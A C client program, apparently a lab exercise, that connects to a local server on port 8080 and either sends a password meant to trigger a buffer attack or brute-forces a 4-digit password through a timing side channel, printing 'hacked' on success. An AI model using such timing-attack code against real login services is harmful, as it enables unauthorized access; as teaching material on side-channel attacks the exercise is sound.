#include <stdio.h>

#include <netdb.h>

#include <netinet/in.h>

#include <unistd.h>

#include <stdlib.h>

#include <time.h>

#include <string.h>

#include <sys/socket.h>

#include <sys/types.h>

#include <arpa/inet.h>

#include <time.h>

#define MAX 80 

#define PassLength 4

#define PORT 8080 

#define SA struct sockaddr 





void func(int sockfd) 

{ 

	char buff[MAX]; 

        char choose[2];

        int pass[PassLength]={0,0,0,0};

	char output[PassLength+1];



	int n; 

	for (;;) { 

           bzero(buff, sizeof(buff)); 



           printf("for buffer attack press 1 for timing atack press 2\n");

         

           scanf("%s",choose);
    

           write(sockfd, choose, sizeof(choose)); 

           



            



           if(strcmp(choose,"1")==0){

          



            

           bzero(buff, sizeof(buff)); 

           printf("enter password in lenght of 6\n");

          scanf("%s",buff);

           write(sockfd, buff, sizeof(buff)); 

           read(sockfd, buff, sizeof(buff)); 



                     printf(" %s\n",buff);

           break;

           

           }

          else{



      

	        printf("starting timming attack....\n"); 



        

       do{

            int i;

          for ( i = 0 ; i < PassLength; ++i)

           {

              output[i] = pass[i] + '0';

           }

                

		       output[i] ='\0';



           printf("now try password  %s\n",output);

           bzero(buff, sizeof(buff)); 

           time_t begin = time(NULL);

           write(sockfd, output, sizeof(output)); 

           

           

           

           read(sockfd, buff, sizeof(buff)); 

           

           time_t end = time(NULL);

           

           pass[(int)(end-begin)-1]++;



		

		

       }while(strcmp(buff,"OK")!=0);



       printf("hacked, the  password  is: %s\n", output); 

       break; 

       



		if ((strncmp(buff, "exit", 4)) == 0) { 

			printf("Client Exit...\n"); 

			break; 

		} 

	}}}





int main() 

{ 

	int sockfd, connfd; 

	struct sockaddr_in servaddr, cli; 



	// socket create and varification 

	sockfd = socket(AF_INET, SOCK_STREAM, 0); 

	if (sockfd == -1) { 

		printf("socket creation failed...\n"); 

		exit(0); 

	} 

	else

		printf("Socket successfully created..\n"); 

	bzero(&servaddr, sizeof(servaddr)); 



	// assign IP, PORT 

	servaddr.sin_family = AF_INET; 

	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); 

	servaddr.sin_port = htons(PORT); 



	// connect the client socket to server socket 

	if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) { 

		printf("connection with the server failed...\n"); 

		exit(0); 

	} 

	else

		printf("connected to the server..\n"); 



	// function for chat 

	func(sockfd); 



	// close the socket 

	close(sockfd); 

} 

